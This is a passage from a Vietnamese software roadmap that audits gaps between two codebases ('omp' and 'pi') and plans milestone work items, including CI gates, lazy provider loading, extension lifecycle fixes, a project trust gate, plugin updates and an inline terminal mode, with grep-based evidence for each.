1. **Baseline phải được chụp SAU khi M1 merge và SAU sóng port đầu tiên**, không phải ở HEAD hôm nay. Chụp ở HEAD thì cổng đỏ ngay lần chạy đầu và mất luôn ý nghĩa. → xem GAP-D13.
2. **`dev:timing` phải chạy được sau khi thêm cổng.** Đo và cổng là hai đường; cổng không được nuốt mất preload. Đây là loại chi tiết mà một PR "thêm cổng" hay xoá nhầm vì không ai chạy lại script cũ.

---

## GAP-M1B-2 — Sáu cổng bất biến dependency/packaging: pinned-deps, runtime-deps, lockfile-commit, ts-relative-imports

**Nguồn:** `pi.2`
**Milestone:** M1B — sóng 0.5, ngay sau GAP-M1B-1
**Effort:** M — khoảng 1 ngày cho 4 cổng. Riêng `check-runtime-deps.mjs` là cổng đắt nhất vì nó đọc cây `package.json` và allowlist.

**Cùng lý do mục trên: là cổng bảo vệ cây port, phải có trước khi chép 21.093 dòng.** Nhưng cổng thứ tư là **cần thiết cho chính M1B**, không chỉ cho tương lai: §Va chạm ghi 223 dòng relative import mang `.ts` phải bỏ, và nói *"Rẻ để kiểm: sau lần quét, `grep -rn 'from "\.[^"]*\.ts"' packages/{chord,protocol,server,client}/src` phải trả 0"*. **Một lần quét tay không giữ được sau khi người thứ ba gửi PR.**

**Cái omp thiếu — đo được.** `package.json:90` khai đúng `"check:ts": "bun run check:tools && bun run --filter './packages/*' --sequential --if-present check:types"` và `:91` `"check:tools": "oxlint . && oxfmt --check …"`. Ba thứ, **không một trong sáu cổng của `pi`**: `grep -rn 'pinned-deps|check-pinned|check-runtime-deps|lockfile-commit|ts-relative-imports' package.json .github/ scripts/` → **0 hit**. Bên `pi`: `check-pinned-deps.mjs` (2.2 KB), `check-runtime-deps.mjs` (5.0 KB) + `.test.mjs` (4.9 KB), `check-lockfile-commit.mjs` (3.9 KB), `check-ts-relative-imports.mjs` (3.3 KB).

**Hình dạng port — chép 4 script `.mjs` + 1 file test.** **KHÔNG chép** `coding-agent-consumer.mjs` và `build-coding-agent-bundle.mjs` — chúng thuộc đường npm-bundle mà omp không dùng. Sửa: filter theo workspace glob của omp.

**Pháp lý:** MIT cho 4 script. `coding-agent-consumer.mjs` không cần — **không chép, không phải vì giấy phép.**

**Cái được bảo toàn — ba điều, cả ba đều là kiểu "cổng đỏ vì chính mình":**
1. **Đặt cổng ngoài `ignorePatterns` 24 dòng sẵn có của `.oxlintrc.json`.** Đưa entrypoint vào đó tắt **mọi** rule khác trên các file đó — đúng cái bẫy GAP-M1-19 đã ghi ở §0.
2. **`check-runtime-deps` phải fail-closed, không fail-soft.** Dependency không resolve được thì báo đỏ, không bỏ qua im lặng. Cổng fail-soft là cổng không có.
3. **`check-ts-relative-imports` phải chấp nhận 2 hit `.d.ts` asset import đã tồn tại** — `tools/browser/prelude-definition.ts:5` và `tools/computer/prelude-definition.ts:3`. Không thì cổng đỏ vì file của chính omp, và người implementer sẽ "sửa cho xanh" bằng cách xoá đúng hai import hợp lệ đó.

---

## GAP-M1B-3 — Khôi phục biến môi trường bị sandbox nuốt khi chạy binary Bun đã compile

**Nguồn:** `pi.46`
**Milestone:** M1B — sóng 0.5, gộp chung PR với hai cổng kiểm
**Effort:** S — khoảng 0,5 ngày. 40 dòng, gần như không sửa.

**Vì sao ở đây.** 40 dòng, không chặn gì, và là mảnh còn thiếu duy nhất của một đường mà omp **đã đo được một nửa**. Gộp vào sóng cổng vì cùng chạm `scripts/` + `package.json`, và cùng là loại việc mà một PR «cổng + thứ nhỏ» chứa hợp lý hơn PR riêng.

**Cái omp thiếu — đúng nửa, và nửa đúng là nửa dễ hiểu sai.** omp có `readLaunchEnv()` tại `packages/utils/src/env.ts:114` (đã đọc lại), được gọi ở `:134` → `const launchEnvValues = readLaunchEnv()`. Nó đọc `/proc/self/environ` trên Linux **chỉ để chụp môi trường trước dotenv**. **Không có đường khôi phục** — khi binary chạy dưới sandbox làm mất biến, omp không biết giá trị gốc để trả lại.

Bên `pi`: `packages/coding-agent/src/bun/restore-sandbox-env.ts` (**36 dòng**, `wc -l` đã đo) + `sandbox-env-setup.ts` (**4 dòng**).

**Hình dạng port — chép nguyên văn 2 file, dán vào `packages/utils/src/env.ts`**, nơi `readLaunchEnv` đã sống, **không tạo thư mục `bun/` mới** — omp không có khái niệm `src/bun/` (đã kiểm: `packages/coding-agent/src/bun` không tồn tại). Thư mục `src/bun/` của pi còn `cli.ts` và `runtime-setup.ts` nữa; **không chép hai file đó**.

**Pháp lý:** MIT, không dính exclusion. Chép nguyên văn, giữ dòng Zechner.

**Cái được bảo toàn — hai điều kiện trên cùng một đường:**
1. **Phải chỉ chạy khi cờ tương đương `BPI_EXECVE` thực sự hiện diện.** Trên macOS và Windows không có `/proc/self/environ` — nhánh phải là **no-op**, không phải throw. Một PR "40 dòng" mà làm hỏng startup trên hai sàn là thảm họa.
2. **Phải chạy TRƯỚC dotenv, không phải sau.** Chạy sau là vô nghĩa: dotenv đã ghi đè rồi, khôi phục ở đó là khôi phục giá trị sai.

---

## GAP-M1B-4 — ~~`pico3`: chốt có port hay không~~ ✅ ĐÃ TRẢ LỜI 2026-09-29 — **KHÔNG chép `pico3`; `core/extensions` là vòng đời đang chạy**

> **Phần "cái được bảo toan" của mục này là một rủi ro đã được bác bỏ bằng đo.** Bản gốc cảnh báo
> rằng *nếu `pico3` là nguồn sự thật về vòng đời extension thì M1B §1 ĐÃ SAI*. Đo trên
> `pi-ref` @ `d6af72e18` cho kết quả ngược lại:
>
> - `git grep -l pico3 -- '*.ts' | grep -v /test/` → **4 file, tất cả trong `experimental/`**,
>   và nó được export qua `"./experimental/pico3"` (`packages/agent/package.json:21`).
> - `core/extensions/` (8 file / 4.506 dòng) được mount bởi `core/agent-session.ts`,
>   `agent-session-runtime.ts`, `agent-session-services.ts`, `cli/args.ts`, `cli/project-trust.ts`,
>   `core/bug-report.ts`.
>
> **Kết luận:** M1B §1 **đúng**; không có bản chép nào cần xem lại. `pico3` là nhánh thử nghiệm
> song song mà chính `pi` cũng không mount, nên nó **không thuộc nghĩa vụ "omp chứa `pi`"**.
> **M2 WI-9 và `GAP-M2-9` không còn bị chặn.**
>
> Phần còn lại của mục này — omp thiếu scheduler / membranes / bounded context
> (`git grep membrane -- packages/` → 0) — vẫn đúng, nhưng là **mục tiêu thiết kế chứ không
> phải mục chép**, và thuộc về quyết định sản phẩm.
>
> Bằng chứng đầy đủ: `.lavish-wip/DECISION-pico3.md`. Quyết định đã được ghi thẳng vào
> `MILESTONE_1B_EXECUTION_PLAN.md`.

, ĐỒNG THỜI với việc làm lại so sánh `core/extensions/` mà M1B §1 đã ghi là chưa làm

**Nguồn:** `pi.7`
**Milestone:** M1B — sóng quyết định, cùng khối correction của §1
**Effort:** **S cho bước quyết định (~1 ngày).** L nếu quyết định port (4–5 ngày). → xem GAP-D10
**Không nên giao một work item chưa biết là copy hay là viết lại.**

**Đây chính là câu hỏi mà M1B §1 nói thẳng là chưa trả lời.** Nguyên văn: *«Việc cần làm lại: `core/extensions/` của `pi` so với `packages/coding-agent/src/extensibility/extensions/` của omp. Đó là so sánh thật sự liên quan tới vòng đời, và nó chưa nằm trong tài liệu này»*. **Không có nơi nào khác trong 7 milestone đã quyết được câu này.** Đặt ở M1B vì M1B là milestone duy nhất được giao quyền trả lời «chép gì từ `pi`».

**Cái omp thiếu.** Không tồn tại pico/pico2/pico3/pico-v5 lineage nào trong omp — `grep -rniE "pico3|pico-v5|harness/pico" MILESTONE_*.md PACKAGE_REORGANIZATION_PLAN.md` chỉ trả về 4 dòng, tất cả nằm trong M1B §5 (durable) và đều là câu nói về `docs/pico-v5.md` của gói durable, **không phải về pico3**.

omp có công cụ khác cùng mục đích — `packages/agent/src/compaction/` (17 file), `append-only-context.ts`, `compaction.ts` 81 KB — nhưng **KHÔNG có scheduler, membranes, hay bounded context** dạng pico3.

**Cái bên kia — đo rồi.** `pi-ref/packages/agent/src/harness/pico3/`: **25 file `.ts`, 8.074 dòng** (16 file cấp gốc + 9 file trong `kinds/`; `find … -exec wc -l` → 8.074, khớp tuyệt đối). Những gì tên gọi nói đúng: `scheduler.ts` (17 KB), `membrane.ts` (4.5 KB), `bounded.ts` (2.8 KB), `session.ts` (57 KB), `harness.ts` (29 KB).

**Hình dạng port — chép nguyên khối, không thiết kế lại.** Đây là thứ duy nhất trong toàn bộ đợt chép `pi` có **bản chất cơ chế vòng đời** — và M1B đã cảnh báo chính xác rằng `chord` **KHÔNG** phải là thứ đó.

**Pháp lý:** MIT, không dính exclusion. **Nhưng khối này nằm trong `packages/agent/` của `pi` — cùng package mà omp đã phân kỳ 100%.** Đây là chỗ phát sinh `Va chạm` nhiều nhất, **không phải ít nhất**; `agent-loop.ts` 148 KB và `compaction/` là hai bên va chạm.

**Cái được bảo toàn — và đây là điều khoản quan trọng nhất của mục.** Khối này có `pico3/kinds/plugin.ts` và `pico3/hooks.ts`. **Nếu pico3 là nguồn sự thật về vòng đời extension, thì M1B §1 ĐÃ SAI** ở chỗ coi `core/extensions/` (4.506 dòng) là vòng đời duy nhất. Bước quyết định phải trả lời câu đó **trước khi ai viết một dòng code** — vì nếu trả lời "pico3 mới là sự thật", thì bảng quyết định ở M1B §1 phải viết lại, và mọi thứ đã chép dựa trên nó sẽ cần xem lại.

**Phụ thuộc.** Không chặn ai. Nhưng **phải chốt trước M2** — M2 WI-9 (`unloadExtension`) và GAP-M2-9 đều giả định có một vòng đời extension **đã biết là gì**; nếu pico3 thay được vòng đời đó thì cả hai phải viết lại.

---

## GAP-M1B-5 — Nạp transport của provider theo nhu cầu thay vì nạp cả module graph tĩnh lúc import

**Nguồn:** `pi.4` + `pi.53` (gộp)
**Milestone:** M1B — **sau** sóng port, trước M2
**Effort:** M — khoảng 1,5 ngày

**Phải đứng sau sóng port** vì M1B đang thêm 6 package mới vào cùng module graph — mỗi package thêm làm chi phí import lúc khởi động nặng thêm. Cùng lý do với GAP-M1B-1: **cổng đo phải tồn tại trước khi tối ưu**, không thì không biết cải thiện có thật không.

**Cái omp thiếu — đo được, và đây là hệ quả quan sát được.** omp nạp **toàn bộ** provider vào cùng module graph tĩnh. `packages/ai/src/stream.ts` value-import trực tiếp:
- `:29` `import { streamGitLabDuo } from "./providers/gitlab-duo"`
- `:30` `import { …, streamGitLabDuoWorkflow } from "./providers/gitlab-duo-workflow"`
- `:32` `import { getVertexAccessToken } from "./providers/google-auth"`
- `:35` `import { streamKimi } from "./providers/kimi"`

Nghĩa là **mở omp bằng provider nào cũng vẫn nạp code GitLab Duo, Kimi và Google auth**. `register-builtins` cũng value-import hơn 12 provider.

Kỹ thuật lazy-loading **CÓ SẴN** trong omp — nhưng chỉ dùng cho OAuth registry/hooks (`api-registry.ts` + `getCustomApi`), **không dùng cho wire transport**. Đó là khoảng cách thật, không phải thiếu kỹ thuật.

**Hình dạng port — LÀM MỚI, không chép.** Không có tệp nào ở `pi` để chép cho riêng mảng này — đây là chỗ omp nên làm khác. Hình dạng: một `PROVIDER_TRANSPORTS` registry value → `() => import(...)` per provider, đọc tại `stream.ts` **sau khi provider đã resolve**.

> Lưu ý phong cách: `AGENTS.md` **cấm** inline import (`await import()`, `import("pkg").Type` trong vị trí kiểu). Mục này là ngoại lệ có chủ đích và phải được ghi vào `AGENTS.md` cùng lúc — nếu không, một reviewer sẽ báo vi phạm và đóng PR. Đề xuất: dùng đúng một chỗ tập trung (`registry.ts`) để phạm vi ngoại lệ là **một file**, không phải `stream.ts`.

**Pháp lý:** không chép gì từ `pi` (làm mới) → **không có nghĩa vụ attribution**. Nếu sau này tham chiếu pattern lazy của `pi` thì vẫn MIT.

**Phụ thuộc — cứng.** GAP-M1B-1 (cổng entry-graph): không có nó thì **không chứng minh được cải thiện**, và một PR tối ưu không kèm phép đo là một PR không kiểm chứng được. Nên làm **sau khi M1B port xong**, để một lần đo bao hết thay đổi thay vì đo nhiều lần trên nền đang chuyển động.

**Cái được bảo toàn.** Hành vi wire phải **giống hệt**: cùng tập provider, cùng error surface. Và điều kiện âm bắt buộc: **provider không được biến mất lúc runtime chỉ vì lazy import thất bại** — lỗi phải **nêu đúng tên provider**, không phải `Cannot find module`. Đó là khác biệt giữa một tối ưu và một lỗi.

---

# M2 — sáu mục mới

> Vì sao bốn mục đầu nằm **sau** lần lượt WI-9 / WI-2 / WI-3 / WI-6, và vì sao hai mục sau **không giao vào M2**: xem **P4**.

## GAP-M2-9 — Context của extension phải tự vô hiệu hoá sau unload, thay vì để closure đọc `#field` của runner đã bị tháo

**Nguồn:** `pi.17`
**Milestone:** M2 — ngay sau WI-9 (unloadExtension)
**Effort:** M — khoảng 1,5 ngày

**WI-9 là work item TẠO RA mối nguy này.** Chưa có unload thì không có gì để "stale". Đặt cạnh WI-9 vì **một PR tháo extension mà để lại context sống là PR tạo lỗi mới trong lúc đang đóng lỗi cũ**.

Đã kiểm: `grep -rn 'unloadExtension' packages/coding-agent/src --include='*.ts' | grep -v /test/` → **0 hit**. WI-9 chưa có. Điều này xác nhận phụ thuộc là **cứng**, không phải lịch sự.

**Cái omp thiếu — và cơ chế đã đọc để xác nhận.** `createContext()` (`runner.ts:1271`) trả một object phẳng. Các method là closure đọc `#field` của runner **tại thời điểm gọi** — ví dụ `getContextUsage: () => this.#getContextUsageFn()`, `compact: … => this.#compactFn(…)`, `isIdle: () => this.#isIdleFn()`, `abort: () => this.#abortFn()`, cùng getter `get model() { return getModel(); }`.

Sau khi extension bị unload, `ctx` cũ vẫn gọi được: hoặc vào **runner đã giải phóng bucket**, hoặc — tệ hơn — vào **runner MỚI đã thay thế**, tức là **extension cũ điều khiển nhầm extension mới**. Không có `invalidated` / `disposed` discriminator nào trên context.

**Hình dạng port — LÀM MỚI.** `createContext()` trả object có `#state`; mỗi method kiểm tra state **trước khi** đọc `#field`; `unloadExtension` chuyển state sang `disposed` và context cũ **ném lỗi có tên** thay vì gọi vào hư không.

**Pháp lý:** làm mới → không có nghĩa vụ copy.

**Cái được bảo toàn — ba điều, và một cái bẫy âm thầm:**
1. **Hai call site, không phải một.** `runner.ts:1293` và `agent-session.ts:7552` đều hiện thực `isProjectTrusted: () => true`. Mục này phải giữ **cả hai** đúng hình dạng.
2. **`isProjectTrusted()` phải giữ trả `true`.** Đây là chỗ dễ biến mục này thành cổng tin cậy theo thư mục (GAP-M2-13) một cách **âm thầm** — hai việc khác nhau, một PR riêng.
3. **Phải cùng PR với M2 WI-9, không phải PR riêng sau.**

---

## GAP-M2-10 — `/reload` thật: phát `reason: "reload"` và nối lệnh vào đường reload đã tồn tại

**Nguồn:** `pi.107`
**Milestone:** M2 — sau WI-2 (thứ tự nạp extension)
**Effort:** S — khoảng 0,5 ngày. **Nhỏ hơn nhiều so với cảm giác ban đầu; đây là mục mà đo lại đã cứu được khỏi việc bịa một việc lớn.**

**Reload extension mà thứ tự nạp chưa chốt thì mỗi lần reload là một lần gánh thêm tên trùng.** WI-2 là nơi chốt quy tắc trùng tên; reload là nơi quy tắc đó **chạy nhiều lần nhất**.

**Cái omp thiếu — ĐÚNG HƯỚNG NHƯNG SAI ĐỘ LỚN.** GAP doc nói «không có đường nối thực sự». Đo lại ở HEAD thì **phần lớn đường ống ĐÃ CÓ**:
- `rescopeHeadlessToCwd` (`slash-commands/builtin-lifecycle.ts:871`) gọi đủ `settings.reloadForCwd(cwd)`, `session.refreshSkillsAndCommands()`, `runtime.refreshCommands?.()`, `runtime.reloadPlugins()` — và đã có **bốn call site** ở `:116/:133/:137/:142`.
- Kiểu `reason: "startup" | "reload"` đã khai ở `extensibility/extensions/types.ts:743`.

Thiếu đúng hai thứ:
1. **Không có lệnh `/reload` cho người dùng.** `grep -rn 'name: "reload"'` chỉ trả về `builtin-session.ts:672` → `{ name: "reload", description: "Force reload MCP runtime tools" }` — tức chỉ reload MCP.
2. **Không có call site nào emit `reason: "reload"`.** `grep -rn 'reason: "reload"' packages --include='*.ts'` → **0 hit**. Nhánh đó là **code chết**.

**Hình dạng port — LÀM MỚI, rất nhỏ.** Một entry slash command gọi lại `rescopeHeadlessToCwd` + đổi tham số `reason` xuống loader. **Không dựng lại tầng reload — nó đã có.**

**Pháp lý:** làm mới → không có nghĩa vụ copy.

**Cái được bảo toàn — hai điều:**
1. **Phải hỏi trước khi reload extension đang chạy**, vì teardown chạm timer đang giữ.
2. **Phải giữ nguyên hành vi của `/reload` sẵn có (chỉ MCP)** — hoặc nâng nó lên, hoặc thêm lệnh riêng, **chứ không được đổi nghĩa lệnh cũ**. Đổi nghĩa một lệnh đã có là thay đổi hành người dùng thấy, không phải refactor.

---

## GAP-M2-11 — Hai mặt cửa render còn thiếu cho extension: `registerEntryRenderer` và `registerMarkdownTransformer`

**Nguồn:** `pi.99` (phần thiếu)
**Milestone:** M2 — cùng WI-3 (bảng relay sự kiện)
**Effort:** S — khoảng 0,5–1 ngày cho hai method + test xung đột

**WI-3 là bảng relay sự kiện có trình biên dịch kiểm tra** — đó là chỗ duy nhất trong chương trình đang dựng đường cho một render path có kiểm tra. Đặt cạnh WI-3 để **không phải làm lại validate hai lần**.

**Cái omp thiếu — phần lớn đã có, thiếu đúng hai.** `grep -rniE 'registerEntryRenderer|registerMarkdownTransformer|markdownTransformer' packages --include='*.ts'` → **0 hit**.

Đã có và **không silent drop**: đăng ký command / shortcut / tool / flag / message-renderer với chẩn đoán trùng. Chỗ làm mở: `registerMessageRenderer` khai ở `extensibility/extensions/loader.ts:269` và `extensibility/hooks/loader.ts:114`, đặc tả ở `extensibility/extensions/types.ts:1475`.

Thiếu: (1) **không có đường để một extension thay renderer của MỘT entry cụ thể**; (2) **không có đường để nó biến đổi Markdown trước khi render**.

**Hình dạng port — LÀM MỜI, dựa trên `registerMessageRenderer` sẵn có.** Không chép gì từ `pi`.

**Pháp lý:** làm mới → không có nghĩa vụ copy.

**Cái được bảo toàn — hai điều, trong đó một điều là nguy hiểm thật:**
1. **Chỉ mở trên TUI và ACP. RPC/JSON phải giữ nguyên dạng dữ liệu thô** — một transformer Markdown chạy trong RPC sẽ **phá client đọc transcript**. Đây là ranh giới kiến trúc, không phải chi tiết triển khai; ghi vào type, không ghi vào doc.
2. **Phải có chẩn đoán trùng giống hệt các method đăng ký khác** — cùng cơ chế, cùng thông điệp. Lệch ở đây là tạo ra hai cách nói về cùng một lỗi.

---

## GAP-M2-12 — Cổng effect: một tool khai báo được tác động gì, và cổng chặn ở biên thủ tục tác vụ tách khỏi vòng đời của chủ sở hữu

**Nguồn:** `pi.81`
**Milestone:** M2 — sau WI-6 (bảng admission tool)
**Effort:** M–L (thiết kế + một admission table mới + test; lớn hơn vì nó đụng WI-6 đang được viết song song)

**WI-6 biến tool thành MỘT MỤC DỮ LIỆU. Không có cái đó thì khai báo effect cũng chỉ là một chuỗi `if` thứ hai.** Đây là mục duy nhất trong sổ mà **M2 tạo ra** thay vì M2 thừa nhận.

**GẦN NHẤT ĐÃ CÓ:** GAP-M6-12 (chính sách mạng deny-first cho MCP) — cùng hình dạng «deny-first có cấu trúc», khác tài nguyên. Nên xếp cạnh nhau trong một cụm, **không gộp**.

**Cái omp thiếu — ba cổng tồn tại nhưng cả ba SAI NGHĨA.** Đây là điểm quan trọng: không phải thiếu ba cổng, mà có ba cổng **không phân biệt đúng thứ cần phân biệt**.
1. `packages/agent/src/pause.ts:24` `AgentPauseGate` là cổng **PAUSE toàn tiến trình**, poll ở hai biên hành động — **không phân biệt procedure với owner**.
2. M2 WI-6 (chưa làm) là bảng **ADMISSION tĩnh**, không biết gì về effect runtime.
3. M1 W6 là deny **theo mẫu lệnh bash** — mẫu chữ, không phải khai báo effect.

Thiếu: một tool khai báo tập effect của nó; một cổng hỏi **ở biên thủ tục tác vụ**; và ranh giới rõ với lifecycle mà **owner tự tháo**.

**Hình dạng port — THIẾT KẾ, không chép.** Khái niệm này không có tệp nào ở `pi` để chép; chỉ là một ranh giới trong `harness/hooks.ts` + `kinds/tool.ts`.

**Pháp lý:** thiết kế mới. Nếu tham chiếu khái niệm từ `pi` thì ghi MIT.

**Phụ thuộc — CỨNG.** M2 WI-6. Không có một bảng khai báo duy nhất thì khai báo effect là một chuỗi `if` thứ hai — và khi đó WI-6 đã làm sai ở tầng trên.

**Cái được bảo toàn — điều khoản này quan trọng bất thường.** **Không được biến thành sandbox.** `docs/approval-mode.md:72` đã nói thẳng bash pattern policy *"is not process or filesystem containment"*. Cổng effect cũng phải giữ **đúng giới hạn đó** và **nói ra trong doc** — nếu không đọc nó như sandbox thì đó là **một lời hứa giả**, và lời hứa giả trong approval code là hậu quả bảo mật, không phải lỗi tài liệu.

---

## GAP-M2-13 — Cổng tin cậy theo thư mục dự án: `trust.json` ba trạng thái, nạp hai lượt, và re-check ở consumer

**SUA MUC:** GAP-M2-7 + GAP-D9 — sổ đăng ký đã ghi trực tiếp *«GAP-M2-7 chặn bởi M2 WI-0»*; GAP-D9 nói *«M2 WI-0 hiện viết ADR về trust của extension, chưa nói gì về MCP project-scope config»*. Giữ mục này **riêng** vì nó là **THỰC THI**, còn GAP-M2-7 là **trạng thái trust của hook handler**.

**Nguồn:** `pi.24` + `pi.35` + `pi.36` + `pi.103` (gộp 4 mục thành 1)
**Milestone:** **Sau M2 WI-0** — đề xuất M2 sóng 0, hoặc milestone kế tiếp sau M2. **CHƯA được giao vào M2.**
**Effort:** L (M–L theo chính ước lượng của WI-0: ba phương án A/B/C đã được viết ra nhưng **chưa chọn**; phần code M–L)

**Vì sao đẩy ra, và vì sao đây là mục DUY NHẤT phải chờ.** Vì WI-0 nói thẳng phần thực thi là M–L và nằm **ngoài M2**. Giao vào M2 là **chốt ngược chính plan**. Vì đây là mục duy nhất trong sổ phải đợi một quyết định, nó phải nằm **sau WI-0 chứ không cạnh tranh với nó**.

**Cái omp thiếu — đo được, và sự vắng mặt là CỐ Ý.** `isProjectTrusted` → 4 hit: hai khai báo ở `extensibility/extensions/types.ts:496` và `:563`, và **hai hiện thực, đều là closure hằng**:
- `runner.ts:1293` → `isProjectTrusted: () => true`
- `agent-session.ts:7552` → `isProjectTrusted: () => true`

`grep -rn "setProjectTrust|trust.json" packages --include='*.ts'` (non-test) → **0 hit**. Hai test (`test/extension-context-project-trust.test.ts`, `test/issue-7955-extension-project-trusted.test.ts`) chỉ khẳng định giá trị `true`.

Thiếu: tri-state per-directory, danh sách cổng đóng (settings.json / extensions / skills / prompts / themes), hai lượt load, re-check ở consumer. **Đây không phải sơ suất — omp đã chọn không có. Nhưng lựa chọn đó đã được viết ra, và việc lật ngược nó là việc có chủ.**

**Hình dạng port — THIẾT KẾ LẠI, không chép.** `pi` có 4 mục trải trên nhiều file; omp cần **một cơ chế, không phải bốn**. Cổng: một `resolveProjectTrust(cwd) → "yes" | "no" | "undecided"` + một danh sách tài nguyên bị chặn theo quyết định + một `assertTrusted(resource)` mà consumer gọi.

**Pháp lý:** thiết kế mới → không có nghĩa vụ copy. Nếu lấy cấu trúc danh sách cổng từ `pi` thì ghi MIT.

**Phụ thuộc — CỨNG.** M2 WI-0 (ADR) là điều kiện tiên quyết. WI-0 phải chốt **cả danh sách tài nguyên bị bao trùm**, vì chú thích `types.ts:548-561` mô tả project trust là trùm `extensions, settings, skills, resources` — **rộng hơn phạm vi module extension**. Nếu chỉ chốt "extension" thì mục này sẽ phải viết lại lần hai.

**Cái được bảo toàn — mâu thuẫn phải xử lý TRƯỚC, không phải sau.** `types.ts:548-561` **và** `packages/coding-agent/CHANGELOG.md:1057` (mục **ĐÃ PHÁT HÀNH**) đều nói omp không chặn. Đổi hành = **lật ngược một thế bài đã tài liệu hoá và đã phát hành** → cần changelog entry, **không thể là thay đổi im lặng**. Đây là lý do effort là L chứ không phải M, dù phần code có vẻ nhỏ.

**Cần người quyết →** xem GAP-D12.

---

## GAP-M2-14 — Lệnh cập nhật package đã cài: `omp plugin update`, có kiểm digest trước khi ghi đè

**SUA MUC:** GAP-M6-15 — cùng là đường supply-chain của package, khác phần: M6-15 **ghim nguồn**, mục này là **hành vi người dùng**. **Thứ tự: GAP-M6-15 merge trước.**

**Nguồn:** `pi.25` + `pi.100` (gộp)
**Milestone:** Sau M2 WI-8a — đề xuất M2 sóng sau, hoặc M6 cùng GAP-M6-15
**Effort:** S–M (~1 ngày nếu chỉ cập nhật theo nguồn đã ghim; M nếu phải xử lý di chuyển version và rollback)

**WI-8a định tuyến cài đặt plugin qua Settings dưới dạng overlay có namespace. Update là đường cùng họ sau nó, và phải dùng chung namespace đó.** Đồng thời GAP-M6-15 đã làm việc ghim nguồn marketplace — **không có nó thì `update` là tải code không xác thực**.

**Cái omp thiếu — đủ cả bốn kênh cài, thiếu đúng một lệnh.** omp có: npm / git có ref / URL / local; cờ `pinned` (`git-url.ts:16,184`); installer đa nguồn; và (theo GAP-M6-15) đường truyền SHA + provenance.
Thiếu: `grep -rniE 'plugins update|extensions update|updateExtension|updatePlugin' packages/coding-agent/src --include='*.ts'` (non-test) → **0 hit**.
**Cài được nhưng không nâng được** — người dùng phải xoá tay rồi cài lại.

**Hình dạng port — LÀM MỜI trên installer sẵn có** (nguồn + `pinned` + resolver digest đã có sẵn trong đường marketplace). Không chép.

**Pháp lý:** làm mới → không có nghĩa vụ copy.

**Cái được bảo toàn — hai điều, cả hai là bất biến bảo mật:**
1. **Package đang `pinned` phải KHÔNG tự nhảy version** — đó là **toàn bộ ý nghĩa** của cờ đó. `update` xoá bằng chứng cho người dùng.
2. **Update phải là transaction: resolve + tải + verify digest + đổi trỏ.** Không được để lại trạng thái nửa vời nếu tải hỏng giữa chừng — đặc biệt khi cờ `pinned` vừa bị đổi trỏ sang SHA mới.

---

# M3 — bốn mục mới

## GAP-M3-B6 — Thoát alt-screen: một chế độ inline giữ scrollback để terminal selection/copy thật sự hoạt động

**Nguồn:** `codex.118` + `codex.134` (hai mục, một cơ chế)
**Milestone:** M3 — **PR riêng, sau khi M3 ổn định.** Không gộp vào sóng nào đang bay.
**Effort:** M — khoảng 1–1,5 ngày

**Đây là bề mặt người dùng thuần**, nằm đúng miền M3, và M3 là nơi duy nhất đang có người đọc `terminal.ts` và có cổng kiềm multi-viewport (hàng 7 của bảng quyết định M6).

**Nhưng KHÔNG gộp vào sóng đang bay.** `?1049h/l` là **điều kiện tiên quyết của mọi overlay fullscreen và của virtualized scrollback** — một thay đổi sai ở đây làm đỏ hàng loạt test TUI theo kiểu khó chẩn đoán nhất. Để thành PR riêng, sau khi M3 ổn định.

**Cái omp thiếu — ba lệnh, cùng một kết luận.**
1. `grep -rniE 'no-alt-screen|noAltScreen|--inline' packages/coding-agent/src/cli* packages/coding-agent/src/cli.ts` → **0 hit**. Không có cờ nào tắt alt screen.
2. `grep -oE '"tui\.[a-zA-Z.]+"' packages/coding-agent/src/config/all-settings.ts` → **rỗng**. Không có nhóm setting `tui.*` nào để chọn chế độ hiển thị.
3. `grep -rn 'scrollback' packages/tui/src` → chỉ trả về `altScreenActive` tại `terminal.ts:271`, các guard `?1049` ở `:410/:433/:2273`, và `image.ts:278-298` (chọn surface theo alt/screen để vẽ ảnh).

Nghĩa là: **alt screen là ĐƯỜNG MỘT, không có đường về**, và không có chỗ nào cho người dùng nói *"lần sau tôi muốn inline"*.

**Phần omp ĐÃ có:** `?1049h/l` được quản lý đúng — `TerminalOverlay` ở `terminal.ts:410-433` thoát alt screen khi overlay fullscreen đóng lại, `?1000/?1003` mouse tracking tắt theo; `altScreenActive` đã là state thật.
**Thiếu:** một trạng thái **THỨ HAI** mà toàn bộ vòng đời render phải tôn trọng, cộng một bề mặt chọn nó.
**Khoảng cách: SỬA CHO KHỚP** — không có kiến trúc nào của omp nghiêng về một mô hình hiển thị khác.

**Hình dạng port — không chép dòng nào.** Ba việc, theo thứ tự:
1. `DisplayMode = "alt-screen" | "inline"` ở tầng terminal; `altScreenActive` trở thành **một nhánh của nó** chứ không phải một `let` độc lập — và bắt buộc phải xử lý `?1049h` khi khởi động lẫn khi fullscreen overlay mở/đóng **giữa chừng**.
2. Cờ `--inline` / `--display=inline` + một entry trong `/tui` ghi vào settings để lần chạy sau nhớ lựa chọn. Đây là nửa `codex.118`; nó cần **một setting id mới trong `config/registry.ts`**, tức phải đi qua `assertKnownSettingPaths`.
3. Ở chế độ inline: bỏ qua các guard `?1049` và **giữ nguyên mọi thứ khác** — bracketed paste, mouse, DCS passthrough cho tmux. Chọn terminal thì phải còn scrollback của chính terminal; đó là toàn bộ giá trị.

**Pháp lý:** chỉ mang ý tưởng, không chép dòng nào.

**Cái được bảo toàn — bốn điều:**
1. `OverlayFocusOwner` và cơ chế `preFocus` — overlay fullscreen vẫn phải lấy lại focus nền khi đóng.
2. Bracketed paste chuẩn hoá về **1 sự kiện** (`AGENTS.md` nêu rõ, kèm cap 64 MiB chống mất end-marker).
3. DCS passthrough cho tmux và BEL fallback cho Zellij trong `desktop-notify.ts`.
4. `isShimmerAnimationsActive()` và mọi guard `?1049` sẵn có. **Đổi tên biến không được đổi hành.**

**Điều khoản bắt buộc:** chế độ inline **KHÔNG được trở thành mặc định**. Đó là thay đổi hành người dùng thấy và phải có changelog entry. → xem GAP-D11.

**Cổng đỏ của mục này phải nói thẳng:** `bun test packages/tui` hiện còn bị chặn một phần bởi native addon (M6 §1411). Mục này **không được nhận mình xong khi cổng còn đỏ**.

---

## GAP-M3-B7 — Trình remap phím tắt ngay trong TUI: sửa `keybindings.yml` mà không cần rời phiên

**Nguồn:** `codex.103`
**Milestone:** M3 — sau GAP-M3-B4, ghi thứ tự merge rõ ràng
**Effort:** S–M — khoảng 1–1,5 ngày. Overlay gần như thuần: chọn + ghi + reload, không có thuật toán mới.

